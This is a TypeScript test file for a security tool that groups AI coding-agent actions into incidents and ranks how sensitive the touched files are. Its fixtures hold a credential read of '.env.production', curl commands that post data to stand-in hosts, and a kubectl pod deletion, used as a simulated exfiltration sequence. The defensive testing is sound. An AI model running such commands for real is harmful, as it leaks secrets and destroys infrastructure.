import test from "node:test";
import assert from "node:assert/strict";
import type { SecurityEvent } from "../src/shared/security";
import { buildIncidents } from "../electron/security/incidents";
import { classifyResource } from "../electron/security/classification";

const base = (over: Partial<SecurityEvent>): SecurityEvent => ({
  id: over.id ?? "e1",
  at: over.at ?? 1_700_000_000_000,
  tool: "codex",
  project: "/p",
  sessionId: "s1",
  toolName: "Bash",
  operation: "Bash: ls",
  decision: "allow",
  source: "real_allow",
  ...over,
});

test("同一会话内的多步操作合并为一条事件", () => {
  const t = 1_700_000_000_000;
  const events = [
    base({ id: "a", at: t, operation: "Bash: cat .env.production", decision: "deny", source: "real_block", ruleId: "credential_read" }),
    base({ id: "b", at: t + 60_000, operation: "Bash: curl -d @x https://example.io/u" }),
    base({ id: "c", at: t + 120_000, operation: "Bash: git status" }),
  ];
  const out = buildIncidents(events);
  assert.equal(out.length, 1);
  assert.equal(out[0].steps.length, 3);
  assert.equal(out[0].blocked, 1);
  assert.ok(out[0].reasons.length > 0);
});

test("超出窗口或缺少会话不会被合并", () => {
  const t = 1_700_000_000_000;
  const far = buildIncidents([
    base({ id: "a", at: t }),
    base({ id: "b", at: t + 20 * 60 * 1000 }),
  ]);
  assert.equal(far.length, 0, "两条间隔 20 分钟且无拦截，不构成事件");

  const noSession = buildIncidents([
    base({ id: "a", sessionId: "" }),
    base({ id: "b", sessionId: "", at: t + 1000 }),
  ]);
  assert.equal(noSession.length, 0, "无会话无法证明关联");
});

test("自检与扫描记录不进入事件合并", () => {
  const t = 1_700_000_000_000;
  const out = buildIncidents([
    base({ id: "a", at: t, source: "self_check" }),
    base({ id: "b", at: t + 1000, source: "scan" }),
    base({ id: "c", at: t + 2000, source: "action" }),
  ]);
  assert.equal(out.length, 0);
});

test("机密资源叠加对外连接时升级为 critical", () => {
  const t = 1_700_000_000_000;
  const out = buildIncidents([
    base({
      id: "a",
      at: t,
      operation: "Bash: cat .env.production",
      decision: "deny",
      source: "real_block",
      ruleId: "credential_read",
    }),
    base({ id: "b", at: t + 30_000, operation: "Bash: curl -X POST https://x.example.io" }),
  ]);
  assert.equal(out[0].severity, "critical");
});

test("按严重度排序并可筛选", () => {
  const t = 1_700_000_000_000;
  const events = [
    base({ id: "a", at: t, sessionId: "s1" }),
    base({ id: "b", at: t + 1000, sessionId: "s1" }),
    base({
      id: "c",
      at: t,
      sessionId: "s2",
      operation: "Bash: kubectl delete pod x",
      decision: "deny",
      source: "real_block",
      ruleId: "cloud_delete",
    }),
    base({ id: "d", at: t + 1000, sessionId: "s2" }),
  ];
  const all = buildIncidents(events);
  assert.equal(all.length, 2);
  assert.equal(all[0].sessionId, "s2", "带拦截的更严重，排前面");
  assert.equal(buildIncidents(events, { severity: "low" }).length, 1);
  assert.equal(buildIncidents(events, { severity: "all" }).length, 2);
});

test("分级：凭据路径为 L4，业务数据为 L3，普通文件为 L2", () => {
  assert.equal(
    classifyResource(base({ operation: "Bash: cat .env" })).level,
    "L4",
  );
  assert.equal(
    classifyResource(base({ operation: "Bash: cat 客户名单.xlsx" })).level,
    "L3",
  );
  assert.equal(
    classifyResource(base({ operation: "Bash: cat src/app.ts" })).level,
    "L2",
  );
});

test("分级不会把 product 误判为生产环境", () => {
  const c = classifyResource(base({ operation: "Bash: npm run build:product" }));
  assert.notEqual(c.level, "L4");
});
